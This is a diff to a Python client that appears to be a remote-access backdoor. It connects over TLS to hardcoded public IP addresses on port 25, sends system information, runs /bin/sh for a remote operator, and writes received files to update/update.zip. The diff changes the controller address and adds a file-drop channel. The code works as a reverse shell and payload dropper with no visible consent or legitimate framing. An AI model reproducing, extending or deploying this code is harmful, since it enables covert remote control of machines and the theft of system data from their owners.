@@ -10,15 +10,13 @@ import re
 from copy import deepcopy
 import hashlib
 import sys
-import os
-import atexit
-from signal import SIGTERM
-
+import zipfile
 
 class BaseServer:
-    _version = '3.2.0826.1'
+    _version = '6.1.0902.1'
     _client_ssl_sock = None
     _live_thread = None
+    _recv_thread = None
     _clientID = ""
     _clientUID = ""
     _targetUID = ""
@@ -66,7 +64,7 @@ class BaseServer:
             live_msg = {'type': 100}
             err_code = self.send_message(live_msg)
 
-    def connect(self):
+    def _connect(self):
         try:
             # create an AF_INET, STREAM socket (TCP)
             _center_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -83,7 +81,7 @@ class BaseServer:
             return 101
         if message['type'] == 102:
             self._clientUID = message['sender']
-            print("shell client:" + self._clientUID)
+            print("client token:" + self._clientUID)
         else:
             print("login error")
             return 102
@@ -164,15 +162,71 @@ class BaseServer:
 
         return 0
 
+    # send version message
+    def send_version_message(self, target_uid):
+        info_msg = {'type': 101, 'target': target_uid}
+        ver_msg = {'version': self._version, 'ID': self._clientID, 'type': 102,
+                   'time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))}
+        ver_str = json.dumps(ver_msg)
+        return self.send_message(info_msg, ver_str)
+
+    def listen(self, wait_for_quit=True):
+        # start recv thread
+        self._recv_thread = threading.Thread(target=self.recv_message_thread, args=())
+        self._recv_thread.setDaemon(True)
+        self._recv_thread.start()
+
+        # wait for quit
+        if wait_for_quit:
+            self._recv_thread.join()
+
+    def do_message(self, message, data):
+        # print("do message", message)
+        target_uid = message['sender']
+        if message['type'] == 101:
+            self.send_version_message(target_uid)
+
+        elif message['type'] == 105:
+            self.send_systeminfo(target_uid)
+
+        elif message['type'] == 106:
+            filename = 'update/update.zip'
+            # if not message.has_key('filename'):
+            # else:
+            #     filename = 'update\\' + message['filename']
+
+            with open(filename, 'wb') as data_file:
+                data_file.write(data)
+
+            # retruen message
+            message = {'type': 106, 'target': target_uid}
+            self.send_message(message, "save [" + filename + "] ok")
+
+        else:
+            return 0
+
+        return message['type']
+
+    def recv_message_thread(self):
+        pass
+
 
 class DaemonServer(BaseServer):
     _groupID = ""
-    _recv_thread = None
 
-    def bind(self, group_id):
-        self._groupID = group_id
+    def send_bind_message(self, group_id):
         bind_msg = {'type': 102, 'target': self._clientID}
         return self.send_message(bind_msg, self._groupID)
+
+    def connect(self, group_id):
+        self._groupID = group_id
+
+        # connect wscenter
+        err = self._connect()
+        if err > 0:
+            return err
+
+        return self.send_bind_message(group_id)
 
     def get_system_csv(self):
         config_str0 = ""
@@ -191,6 +245,11 @@ class DaemonServer(BaseServer):
         # print("config1", config_str1)
         return config_str0 + "\r\n" + config_str1
 
+    def send_systeminfo(self, target_uid):
+        systeminfo = self.get_system_csv()
+        info_msg = {'type': 105, 'sender': self._clientID, 'target': target_uid}
+        self.send_message(info_msg, systeminfo)
+
     def recv_message_thread(self):
         while True:
             message, data = self.recv_message()
@@ -198,52 +257,44 @@ class DaemonServer(BaseServer):
                 print("disconnect")
                 break
 
-            targetUID = message['sender']
+            if self.do_message(message, data) > 0:
+                continue
 
-            if message['type'] == 105:
-                systeminfo = self.get_system_csv()
-                info_msg = {'type': 105, 'sender': self._clientID, 'target': targetUID}
-                self.send_message(info_msg, systeminfo)
-
-            elif message['type'] == 103:
+            # 继续处理消息
+            target_uid = message['sender']
+            if message['type'] == 103:
                 if data == 'shell':
-                    print("create shell on", targetUID)
+                    # print("shell", target_uid)
                     sh = ShellServer(self._ws_center, self._ws_port, self._crt_file, self._key_file)
-                    sh.connect()
-                    sh.create_shell(targetUID)
-                    sh.listen()
+                    if sh.connect(target_uid) == 0:
+                        sh.listen(False)
+                elif data == 'file':
+                    # print("file", target_uid)
+                    up = FileServer(self._ws_center, self._ws_port, self._crt_file, self._key_file)
+                    if up.connect(target_uid) == 0:
+                        up.listen(False)
 
             else:
                 print('unkown type')
-
-    def listen(self):
-        # start recv thread
-        self._recv_thread = threading.Thread(target=self.recv_message_thread, args=())
-        self._recv_thread.setDaemon(True)
-        self._recv_thread.start()
-
-        # wait for quit
-        self._recv_thread.join()
 
 
 class ShellServer(BaseServer):
     _shell_process = None
     _read_outpipe_thread = None
     _read_errpipe_thread = None
-    _recv_thread = None
 
-    def create_shell(self, UID):
-        self._targetUID = UID
+    def connect(self, target_uid):
+        self._targetUID = target_uid
+
+        # connect wscenter
+        err = self._connect()
+        if err > 0:
+            return err
 
         # create shell
         self._shell_process = subprocess.Popen("/bin/sh", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE)
 
-        # send connect
-        connect_message = {'type': 101, 'target': self._targetUID}
-        self.send_message(connect_message, "ver [" + self._version + "]")
-
-    def listen(self):
         # start read pipe thread
         self._read_outpipe_thread = threading.Thread(target=self.read_outpipe_thread, args=())
         self._read_outpipe_thread.setDaemon(True)
@@ -253,12 +304,8 @@ class ShellServer(BaseServer):
         self._read_errpipe_thread.setDaemon(True)
         self._read_errpipe_thread.start()
 
-        # start recv thread
-        self._recv_thread = threading.Thread(target=self.recv_message_thread, args=())
-        self._recv_thread.setDaemon(True)
-        self._recv_thread.start()
-
-        # time.sleep(100)
+        # send version message
+        return self.send_version_message(self._targetUID)
 
     def read_outpipe_thread(self):
         while True:
@@ -283,7 +330,14 @@ class ShellServer(BaseServer):
             if not message:
                 break
 
-            if message['type'] == 201:
+            if self.do_message(message, data) > 0:
+                continue
+
+            # 继续处理消息
+            if message['type'] == 10:
+                break
+
+            elif message['type'] == 201:
                 self._shell_process.stdin.write(data)
 
             elif message['type'] == 202:
@@ -313,26 +367,48 @@ class ShellServer(BaseServer):
                 self.send_message(message, "unkown type [" + message['type'] + "]")
 
 
+class FileServer(BaseServer):
+    def connect(self, target_uid):
+        self._targetUID = target_uid
+
+        # connect wscenter
+        err = self._connect()
+        if err > 0:
+            return err
+
+        # send version message
+        return self.send_version_message(self._targetUID)
+
+    def recv_message_thread(self):
+        while True:
+            message, data = self.recv_message()
+            if not message:
+                print("disconnect")
+                break
+
+            if self.do_message(message, data) > 0:
+                continue
+
+            # 继续处理消息
+            if message['type'] == 10:
+                break
+            else:
+                print('unkown type')
+
+
 def main():
-    cs = DaemonServer('97.107.137.127', 25, "./keys/client.crt", "./keys/client.key")
-    # cs = DaemonServer('192.168.15.243', 26, "./keys/client.crt", "./keys/client.key")
+    # cs = DaemonServer('97.107.137.127', 25, "./keys/client.crt", "./keys/client.key")
+    cs = DaemonServer('173.230.150.215', 25, "./keys/client.crt", "./keys/client.key")
 
     while True:
         # 1.connect
-        err = cs.connect()
+        err = cs.connect(group_id="d102")
         if err > 0:
             print("connect error")
             time.sleep(60)
             continue
 
-        # 2.bing
-        err = cs.bind("test")
-        if err > 0:
-            print("bind error")
-            time.sleep(60)
-            continue
-
-        # 3.listen
+        # 2.listen
         cs.listen()
         print("end")
         time.sleep(6)
